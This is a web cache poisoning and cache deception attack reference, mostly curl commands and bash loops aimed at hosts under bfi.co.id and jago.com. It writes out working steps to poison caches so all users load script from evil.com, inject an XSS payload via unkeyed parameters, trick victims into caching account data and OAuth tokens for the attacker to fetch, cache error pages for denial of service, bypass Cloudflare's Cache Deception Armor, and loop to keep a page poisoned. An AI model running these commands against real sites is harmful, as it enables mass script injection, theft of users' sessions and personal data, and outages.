# Web Cache Poisoning & Cache Deception Reference

## 1. Overview

### Cache Poisoning vs Cache Deception

| Aspect | Cache Poisoning | Cache Deception |
|--------|----------------|-----------------|
| **Attacker's goal** | Store malicious response in cache → serve to OTHER users | Trick victim into caching THEIR sensitive response → attacker reads it |
| **Who triggers the cache?** | Attacker sends crafted request | Victim clicks attacker's link |
| **What gets cached?** | Attacker-controlled payload (XSS, redirect, header injection) | Victim's authenticated response (PII, tokens, account data) |
| **Victim interaction** | None (mass exploitation) | Must click a crafted URL |
| **Impact** | XSS, open redirect, DoS, defacement | Account takeover, data theft |

### How Caches Work (Simplified)

```
Client → CDN/Cache → Origin Server
         ↓
   Cache Key = scheme + host + path + keyed params
   (Headers, cookies, unkeyed params are IGNORED in key)
```

---

## 2. Decision Tree

```
START: Is there a cache? (check X-Cache, cf-cache-status, Age, Via headers)
  │
  ├─ NO → Not applicable, move on
  │
  └─ YES → Identify cache key components
       │
       ├─ Can you inject UNKEYED input that reflects in response?
       │    │
       │    ├─ YES → CACHE POISONING
       │    │    ├─ Reflects in HTML body? → Stored XSS
       │    │    ├─ Reflects in Location header? → Open Redirect
       │    │    ├─ Reflects in Link/meta? → Resource import hijack
       │    │    └─ Causes error/different status? → DoS
       │    │
       │    └─ NO → Check for cache deception
       │
       └─ Does the cache store responses for paths the origin treats dynamically?
            │
            ├─ YES → CACHE DECEPTION
            │    ├─ Append static extension to dynamic endpoint
            │    ├─ Use path delimiter confusion
            │    └─ Exploit normalization differences
            │
            └─ NO → Low likelihood, check edge cases
```

---

## 3. Cache Poisoning Techniques

### 3.1 Unkeyed Headers

Headers not included in the cache key but processed by the origin.

**Common unkeyed headers:**
- `X-Forwarded-Host` / `X-Forwarded-Scheme` / `X-Forwarded-Proto`
- `X-Original-URL` / `X-Rewrite-URL`
- `X-Host` / `X-Forwarded-Server`
- `Transfer-Encoding` (desync)
- `X-Forwarded-Port`

**Example: X-Forwarded-Host poisoning**
```bash
# Step 1: Identify reflection with cache buster
curl -s "https://target.bfi.co.id/page?cb=rnd123" \
  -H "X-Forwarded-Host: evil.com" \
  -I | grep -i "cf-cache-status\|x-cache\|location"

# Step 2: Confirm reflection in body/headers
curl -s "https://target.bfi.co.id/page?cb=rnd456" \
  -H "X-Forwarded-Host: evil.com" | grep "evil.com"

# Step 3: Poison the cache (remove cache buster)
curl -s "https://target.bfi.co.id/page" \
  -H "X-Forwarded-Host: evil.com" \
  -D - -o /dev/null | grep -i "cf-cache-status"
# Wait for cf-cache-status: MISS → repeat → HIT = poisoned

# Step 4: Verify poison
curl -s "https://target.bfi.co.id/page" | grep "evil.com"
```

**Example: X-Forwarded-Scheme → HTTPS redirect loop**
```bash
curl -s "https://target.jago.com/?cb=xyz789" \
  -H "X-Forwarded-Scheme: http" \
  -D - -o /dev/null | grep -i "location\|status\|cf-cache"
# If 301/302 to same URL with https → DoS via redirect loop
```

### 3.2 Unkeyed Query Parameters

Some caches exclude certain query parameters from the cache key.

**Common unkeyed params:**
- UTM parameters: `utm_source`, `utm_medium`, `utm_campaign`, `utm_content`
- Analytics: `fbclid`, `gclid`, `mc_cid`, `_ga`
- Framework params: `_method`, `_format`

```bash
# Test if utm_source is unkeyed
# Request 1: Prime cache
curl -s "https://target.bfi.co.id/page?cb=test1" -D - -o /dev/null

# Request 2: Same URL + utm param, check if HIT
curl -s "https://target.bfi.co.id/page?cb=test1&utm_source=xss" -D - -o /dev/null \
  | grep "cf-cache-status"
# If HIT → utm_source is unkeyed

# If utm_source reflects in page:
curl -s "https://target.bfi.co.id/page" \
  --data-urlencode 'utm_source="><script>alert(1)</script>' \
  -G | grep "script"
```

### 3.3 Fat GET (Body in GET Request)

Some frameworks parse GET request bodies. If the cache ignores the body but the origin processes it:

```bash
# Test fat GET - does the body override a query param?
curl -s "https://target.jago.com/api/endpoint?cb=fat1&param=normal" \
  -X GET \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=injected_value" \
  -D - -o /dev/null

# If response reflects "injected_value" instead of "normal":
# The body param overrides the query param but isn't in cache key
# Poison:
curl -s "https://target.jago.com/api/endpoint?param=normal" \
  -X GET \
  -d "callback=evil_function" \
  -D -
```

### 3.4 URL Normalization Differences

Cache and origin may normalize URLs differently (encoding, case, dot segments).

```bash
# Path normalization: cache normalizes but origin doesn't
curl -s "https://target.bfi.co.id/page/..%2f..%2fadmin?cb=norm1" -D -

# Case sensitivity: cache treats /PAGE = /page, origin doesn't
curl -s "https://target.bfi.co.id/PAGE?cb=norm2" -D -

# Encoded slash: %2F vs /
curl -s "https://target.bfi.co.id/static%2f..%2fapi/secret?cb=norm3" -D -

# Double encoding
curl -s "https://target.bfi.co.id/%2561dmin?cb=norm4" -D -
```

---

## 4. Cache Deception Techniques

### 4.1 Path Confusion (Path Traversal in Cache Key)

The origin resolves `/account/settings/anything.css` to `/account/settings` (ignores trailing path), but the cache sees `.css` extension and caches it.

```bash
# Test: Does appending a static extension still return dynamic content?
curl -s "https://target.bfi.co.id/account/profile/nonexistent.css" \
  -H "Cookie: session=VICTIM_SESSION" \
  -D - | grep -i "cf-cache-status\|content-type"

# If response contains user data AND cf-cache-status shows MISS/HIT → vulnerable
# Attack URL to send to victim:
# https://target.bfi.co.id/account/profile/x.css

# After victim visits, attacker fetches:
curl -s "https://target.bfi.co.id/account/profile/x.css" -D -
```

### 4.2 Delimiter Differences

Cache and origin disagree on what terminates the path.

**Common delimiters to test:**
- Semicolon: `/account;x.css`
- Null byte: `/account%00.css`
- Hash (encoded): `/account%23.css`
- Question mark (encoded): `/account%3F.css`
- Newline: `/account%0a.css`
- Tab: `/account%09.css`

```bash
# Semicolon delimiter (common in Java/Spring)
curl -s "https://target.jago.com/account/settings;test.css?cb=delim1" \
  -H "Cookie: session=VALID_SESSION" \
  -D - | head -20

# Origin sees: /account/settings (semicolon terminates path in Spring)
# Cache sees: /account/settings;test.css (static file, cacheable)

# Null byte
curl -s "https://target.bfi.co.id/api/me%00.js?cb=delim2" \
  -H "Cookie: session=VALID_SESSION" \
  -D -

# Encoded newline
curl -s "https://target.bfi.co.id/dashboard%0a.png?cb=delim3" \
  -H "Cookie: session=VALID_SESSION" \
  -D -
```

### 4.3 Static Extension Tricks

```bash
# Common cacheable extensions to try:
EXTENSIONS=(.css .js .png .jpg .gif .ico .svg .woff .woff2 .ttf .pdf .xml)

for ext in "${EXTENSIONS[@]}"; do
  echo "Testing: /account/profile${ext}"
  curl -s "https://target.bfi.co.id/account/profile${ext}?cb=$(date +%s)" \
    -H "Cookie: session=VALID" \
    -D - -o /dev/null | grep -i "cf-cache-status"
done

# Path parameter style (Ruby/Rails)
curl -s "https://target.jago.com/account.json?cb=ext1" \
  -H "Cookie: session=VALID" -D -

# Dot segment after path
curl -s "https://target.bfi.co.id/account/./static.css?cb=ext2" \
  -H "Cookie: session=VALID" -D -
```

### 4.4 Static Directory Prefix Exploitation

```bash
# Cache rule: store anything under /assets/, /static/, /scripts/
# Origin: resolves dot-segments (..%2f)
# Attack: /assets/..%2fprofile → origin resolves to /profile, cache sees /assets/* prefix

# Test normalization by origin (use non-cacheable method or path)
curl -s -X POST "https://target.com/assets/..%2fprofile" \
  -H "Cookie: session=VALID" -D -
# If returns profile data → origin resolves dot-segments

# Test normalization by cache
curl -s "https://target.com/assets/..%2fjs/app.js" -D -
# If NOT cached → cache doesn't resolve dot-segments (exploitable!)
# If cached → cache resolves too (not exploitable this way)

# Exploit: victim visits /assets/..%2faccount/settings
# Origin returns: account settings (sensitive)
# Cache stores under: /assets/* prefix (static rule matches)
# Attacker fetches same URL → gets victim's cached data

# Also try: /static/..%2fapi/me, /images/..%2fdashboard
# Encode only the second slash: ..%2f (not %2e%2e%2f)
# Some CDNs match the slash after prefix: /assets/ → must keep first /
```

### 4.5 Delimiter Decoding Discrepancies

```bash
# Test: does origin decode %23 to # (and use as delimiter)?
# While cache sees %23 as literal path character?

# Encoded hash
curl -s "https://target.com/profile%23wcd.css?cb=dec1" \
  -H "Cookie: session=VALID" -D -
# If returns profile data → origin decoded %23 to # (truncated path)
# If cached → cache didn't decode %23 (sees .css extension)

# Encoded question mark
curl -s "https://target.com/account%3fwcd.css?cb=dec2" \
  -H "Cookie: session=VALID" -D -
# Some caches decode %3f then forward → origin sees /account?wcd.css

# Encoded null
curl -s "https://target.com/settings%00.js?cb=dec3" \
  -H "Cookie: session=VALID" -D -
# OpenLiteSpeed uses %00 as delimiter

# Test all encoded delimiters systematically:
for char in "%23" "%3f" "%00" "%0a" "%09" "%3b" "%2e"; do
  echo -n "Testing $char: "
  curl -s "https://target.com/account${char}test.css?cb=$(date +%s)" \
    -H "Cookie: session=VALID" \
    -D - -o /dev/null | grep -i "cf-cache-status\|x-cache"
done
```

### 4.6 Cloudflare-Specific Path Confusion

```bash
# Cloudflare caches based on file extension by default
# Test with common Cloudflare-cached extensions:
curl -s "https://target.bfi.co.id/api/user/profile/test.avif?cb=cf1" \
  -H "Cookie: session=VALID" \
  -D - | grep -i "cf-cache-status"

# /path/to/dynamic/endpoint/anything.woff2
curl -s "https://target.bfi.co.id/settings/x.woff2?cb=cf2" \
  -H "Cookie: session=VALID" \
  -D - | grep -i "cf-cache-status"
```

---

## 5. Detection

### 5.1 Cache Behavior Identification

```bash
# Step 1: Identify cache presence
curl -sI "https://target.bfi.co.id/?cb=detect1" | grep -i \
  "cf-cache-status\|x-cache\|age\|x-varnish\|x-served-by\|via\|x-cdn"

# Step 2: Determine cache timing
# Send same request twice:
curl -sI "https://target.bfi.co.id/page?cb=detect2" | grep -i "cf-cache-status"
# → MISS
curl -sI "https://target.bfi.co.id/page?cb=detect2" | grep -i "cf-cache-status"
# → HIT (confirms caching)

# Step 3: Check Vary header (what's keyed)
curl -sI "https://target.bfi.co.id/page?cb=detect3" | grep -i "vary"
# Vary: Accept-Encoding → encoding is keyed
# Vary: Cookie → cookie is keyed (harder to exploit)

# Step 4: Check Cache-Control
curl -sI "https://target.bfi.co.id/page?cb=detect4" | grep -i "cache-control"
# no-store/no-cache/private → shouldn't be cached (but CDN might ignore!)
```

### 5.2 Keyed vs Unkeyed Input Detection

```bash
# Method: Send request with unique value, check if second request (without value) returns cached version

# Test header (X-Forwarded-Host):
curl -s "https://target.bfi.co.id/page?cb=key1" \
  -H "X-Forwarded-Host: unique-canary-12345.com" -D - -o /tmp/resp1.txt

curl -s "https://target.bfi.co.id/page?cb=key1" -D - -o /tmp/resp2.txt

# If resp2 contains "unique-canary-12345" → header is unkeyed AND reflected

# Test query param:
curl -s "https://target.bfi.co.id/page?cb=key2&utm_source=canary99" -D - -o /dev/null
curl -s "https://target.bfi.co.id/page?cb=key2" -D - -o /tmp/resp3.txt
grep "canary99" /tmp/resp3.txt
# If found → utm_source is unkeyed and reflected

# Automated header fuzzing (manual approach):
HEADERS=("X-Forwarded-Host" "X-Forwarded-Scheme" "X-Forwarded-Proto" \
  "X-Original-URL" "X-Rewrite-URL" "X-Forwarded-Port" "X-Host" \
  "X-Forwarded-Server" "X-HTTP-Method-Override" "X-Amz-Website-Redirect-Location")

for h in "${HEADERS[@]}"; do
  CB="hdr$(echo $h | md5sum | cut -c1-6)"
  curl -s "https://target.bfi.co.id/page?cb=$CB" \
    -H "$h: canary-$CB.evil.com" -D - -o /dev/null | grep -i "cf-cache"
  sleep 1
  BODY=$(curl -s "https://target.bfi.co.id/page?cb=$CB")
  if echo "$BODY" | grep -q "canary-$CB"; then
    echo "[!] UNKEYED & REFLECTED: $h"
  fi
done
```

---

## 6. Exploitation Scenarios

### 6.1 Stored XSS via Cache Poisoning

```bash
# Unkeyed X-Forwarded-Host reflected in <script src="//HOST/resource.js">
curl -s "https://target.bfi.co.id/" \
  -H "X-Forwarded-Host: evil.com" \
  -D - -o /dev/null
# Repeat until cf-cache-status: HIT
# All users now load script from evil.com
```

### 6.2 Account Takeover via Cache Deception

```bash
# 1. Craft URL: https://target.bfi.co.id/api/me/x.css
# 2. Send to victim (phishing, XSS, etc.)
# 3. Victim visits → their authenticated /api/me response cached as x.css
# 4. Attacker fetches:
curl -s "https://target.bfi.co.id/api/me/x.css"
# → Returns victim's account data (email, tokens, PII)
```

### 6.3 DoS via Cache Poisoning

```bash
# Poison with invalid Host → 400/500 error cached
curl -s "https://target.jago.com/important-page" \
  -H "X-Forwarded-Host: aaaaaaa" \
  -D - -o /dev/null
# If origin returns error and cache stores it → DoS for all users
```

### 6.4 OAuth Token Theft via Cache Deception

```bash
# Target: OAuth callback that displays tokens
# URL: https://target.jago.com/oauth/callback?code=xxx
# Deception URL: https://target.jago.com/oauth/callback/x.css?code=xxx
# If cached → attacker retrieves the response containing the token
```

### 6.5 Cache Poisoning via HTTP Method Override

```bash
# Some frameworks support method override headers
curl -s "https://target.bfi.co.id/api/data?cb=method1" \
  -H "X-HTTP-Method-Override: POST" \
  -D -
# If POST response gets cached under GET cache key → different content served
```

---

## 7. Cloudflare-Specific

### 7.1 cf-cache-status Values

- `HIT` — Served from cache
- `MISS` — Not in cache, fetched from origin (now cached)
- `EXPIRED` — Was cached but TTL expired, re-fetched
- `DYNAMIC` — Not eligible for caching (Cloudflare won't cache)
- `BYPASS` — Cache bypassed (e.g., cookie-based rule)
- `REVALIDATED` — Cache validated with origin (304)

```bash
# Check cache status
curl -sI "https://target.bfi.co.id/page" | grep -i "cf-cache-status"
```

### 7.2 Default Caching Rules

Cloudflare caches by extension by default:
```
.css .js .jpg .jpeg .png .gif .ico .svg .webp .avif
.woff .woff2 .ttf .eot .otf
.pdf .swf .xml .json (sometimes)
.mp3 .mp4 .ogg .webm
```

**Important:** Cloudflare does NOT cache HTML by default. It requires:
- Page Rules with "Cache Everything"
- Cache Rules in dashboard
- `Cache-Control` headers from origin + appropriate content-type

```bash
# Test if HTML is cached (Page Rule / Cache Everything)
curl -sI "https://target.bfi.co.id/page" | grep -i "cf-cache-status"
# DYNAMIC = not cached, HIT/MISS = cached (Page Rule active)
```

### 7.3 Cloudflare APO (Automatic Platform Optimization)

APO caches HTML for WordPress sites. Headers to look for:
```bash
curl -sI "https://target.bfi.co.id/" | grep -i "cf-apo\|cf-edge\|cf-cache"
# cf-apo-via: tcache → APO is active, HTML is cached
```

**APO poisoning is high-impact** — entire HTML pages are cached.

### 7.4 Cache Deception Armor

Cloudflare's mitigation for cache deception. When enabled:
- Verifies the origin's `Content-Type` matches the file extension
- `/account/x.css` returning `text/html` → NOT cached

```bash
# Test if Cache Deception Armor is active:
curl -sI "https://target.bfi.co.id/account/test.css" \
  -H "Cookie: session=VALID" | grep -i "cf-cache-status\|content-type"

# If cf-cache-status: MISS and subsequent request is still MISS → Armor active
# If cf-cache-status: HIT → Armor NOT active or misconfigured
```

**Bypassing Cache Deception Armor:**
```bash
# If origin returns Content-Type: application/json for API endpoints:
# Try .json extension (matches content-type)
curl -s "https://target.bfi.co.id/api/user/profile.json?cb=armor1" \
  -H "Cookie: session=VALID" -D -

# Path parameter confusion (Armor checks extension of final path segment)
curl -s "https://target.bfi.co.id/api/user;.js?cb=armor2" \
  -H "Cookie: session=VALID" -D -
```

### 7.5 Cloudflare Transform Rules & Cache Key

```bash
# Cloudflare may strip query params from cache key via Transform Rules
# Test: Are ALL query params keyed?
curl -sI "https://target.bfi.co.id/page?a=1&b=2" | grep "cf-cache"
# MISS
curl -sI "https://target.bfi.co.id/page?a=1&b=2" | grep "cf-cache"
# HIT
curl -sI "https://target.bfi.co.id/page?a=1&b=3" | grep "cf-cache"
# If HIT → 'b' is not in cache key
```

### 7.6 GCP Global Load Balancer (*.jago.com)

```bash
# GCP GLB uses Cloud CDN. Check headers:
curl -sI "https://target.jago.com/page" | grep -i "x-goog\|via\|age\|x-cache"

# Cloud CDN cache key includes: host + path + query string (by default)
# Custom cache key policies may exclude headers/params

# Cloud CDN respects Cache-Control from origin
# If origin sends: Cache-Control: public, max-age=3600 → cached
```

---

## 8. Tools

### 8.1 Param Miner (Burp Extension)

**Purpose:** Automatically discover unkeyed headers and parameters.

**Usage:**
1. Install from BApp Store
2. Right-click request → Extensions → Param Miner → Guess headers/params
3. Check "Output" tab and "Issues" for findings

**Key settings:**
- Enable "Add dynamic cachebuster"
- Set "Max one per host" to avoid rate limiting
- Use custom wordlists for target-specific params

### 8.2 Web Cache Vulnerability Scanner (WCVS)

```bash
# Install
go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest

# Basic scan
wcvs -u "https://target.bfi.co.id/" -hw "X-Forwarded-Host"

# Full scan with custom headers
wcvs -u "https://target.bfi.co.id/page" \
  -headers "X-Forwarded-Host,X-Forwarded-Scheme,X-Original-URL" \
  -parameters "utm_source,utm_medium,callback"
```

### 8.3 Manual Testing with curl

```bash
# Cache buster function
cb() { echo "cb=$(openssl rand -hex 4)"; }

# Quick test template
curl -s "https://target.bfi.co.id/page?$(cb)" \
  -H "X-Forwarded-Host: test.evil.com" \
  -D - | grep -i "cf-cache\|evil"
```

### 8.4 Useful One-Liners

```bash
# Enumerate cached vs dynamic pages
while read path; do
  STATUS=$(curl -sI "https://target.bfi.co.id$path" | grep -i "cf-cache-status" | awk '{print $2}')
  echo "$path → $STATUS"
done < paths.txt

# Race condition: poison before cache expires
while true; do
  curl -s "https://target.bfi.co.id/page" \
    -H "X-Forwarded-Host: evil.com" -o /dev/null
  sleep 0.1
done
```

---

## 9. Pitfalls & Common Mistakes

1. **Forgetting cache busters during testing** — You'll poison the real cache and affect other users/testers. ALWAYS use `?cb=random` during discovery.

2. **Cache TTL too short** — Poison expires quickly. Check `Cache-Control: max-age` and `Age` headers to time your attack.

3. **Vary header kills your poison** — If `Vary: Cookie` is set, each user gets their own cache entry. Poisoning only affects users with identical cookies (usually none).

4. **WAF blocks your payload** — Cloudflare WAF may block XSS payloads in headers. Use encoding or less obvious payloads for PoC.

5. **Testing on production without authorization** — Cache poisoning affects ALL users. Get explicit written permission and test during low-traffic windows.

6. **Confusing DYNAMIC with not-vulnerable** — `cf-cache-status: DYNAMIC` means Cloudflare won't cache it. Look for other cache layers (Varnish, Nginx, application cache).

7. **Not checking all cache layers** — Request may pass through: Browser cache → CDN (Cloudflare) → Load Balancer cache → Reverse proxy cache → Application cache.

8. **Ignoring HTTP/2 pseudo-headers** — `:authority`, `:path` may be handled differently. Test with `--http2` flag.

9. **Regional cache differences** — Cloudflare has 300+ PoPs. Cache is per-datacenter. Your poison only affects users hitting the same PoP.

10. **Missing the response splitting angle** — If you can inject `\r\n` in a header value, you might be able to inject entire response headers including `X-Cache-Control`.

---

## 10. Checklist

```
□ 1. IDENTIFY CACHE: Check cf-cache-status, X-Cache, Age, Via headers
      curl -sI "https://target/?cb=chk1" | grep -i "cache\|age\|via"

□ 2. MAP CACHE KEY: Determine what's keyed (path, params, headers)
      - Send identical requests with different values for each component
      - If second request is HIT → that component is NOT in cache key

□ 3. FUZZ UNKEYED HEADERS: Test X-Forwarded-Host, X-Forwarded-Scheme,
      X-Original-URL, X-Forwarded-Port, X-Host (use Param Miner)
      curl -s "https://target/?cb=chk3" -H "X-Forwarded-Host: canary.com" -D -

□ 4. FUZZ UNKEYED PARAMS: Test utm_*, fbclid, gclid, _ga, _method
      curl -s "https://target/?cb=chk4&utm_source=canary" -D -

□ 5. TEST FAT GET: Send GET with body, check if body params override query
      curl -s "https://target/?param=a&cb=chk5" -X GET -d "param=b" -D -

□ 6. TEST CACHE DECEPTION: Append static extensions to authenticated endpoints
      curl -s "https://target/account/x.css?cb=chk6" -H "Cookie: sess=X" -D -

□ 7. TEST DELIMITER CONFUSION: Try ;, %00, %0a, %23 before extension
      curl -s "https://target/account;x.css?cb=chk7" -H "Cookie: sess=X" -D -

□ 8. CHECK NORMALIZATION: Test path traversal, encoding, case differences
      curl -s "https://target/static/../account?cb=chk8" -D -

□ 9. VERIFY CLOUDFLARE SPECIFICS: Check APO, Cache Deception Armor, Page Rules
      curl -sI "https://target/" | grep -i "cf-apo\|cf-cache"

□ 10. DOCUMENT & REPORT: Record cache key, TTL, affected endpoints, impact
       - Screenshot cf-cache-status: HIT with poisoned/deceived content
       - Note regional limitations and reproducibility steps
```

---

## Quick Reference: Cache Buster Patterns

```bash
# Always use cache busters during testing!
# Cloudflare includes full query string in cache key by default

# Random param (safest)
?cb=abc123
?cachebust=random_value
?_=$(date +%s)

# If query params are stripped from key, use path-based:
/page/cb-random123
/page;cb=random123
```

## Quick Reference: Impact Ratings

- **Cache Poisoning → Stored XSS**: Critical (P1)
- **Cache Poisoning → Open Redirect**: High (P2)
- **Cache Poisoning → DoS**: High (P2)
- **Cache Deception → Account Data**: Critical (P1)
- **Cache Deception → Session Tokens**: Critical (P1)
- **Cache Deception → Non-sensitive data**: Medium (P3)
